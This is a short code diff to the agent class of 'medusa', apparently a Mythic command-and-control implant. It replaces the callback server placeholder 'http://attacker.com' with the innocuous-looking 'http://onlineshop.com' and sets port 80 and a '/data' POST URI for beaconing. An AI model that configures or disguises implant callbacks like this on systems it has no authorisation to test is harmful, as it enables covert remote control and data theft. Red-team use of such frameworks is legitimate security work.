@@ -36,8 +36,9 @@ class medusa:
         self._meta_cache = {}
         self.moduleRepo = {}
         self.current_directory = os.getcwd()
+        # configure on Mythic
         self.agent_config = {
-            "Server": "http://attacker.com",
+            "Server": "http://onlineshop.com",
             "Port": "80",
             "PostURI": "/data",
             "PayloadUUID": "89fe22f1-1cfe-4b65-af5e-76cf4497a9fd",
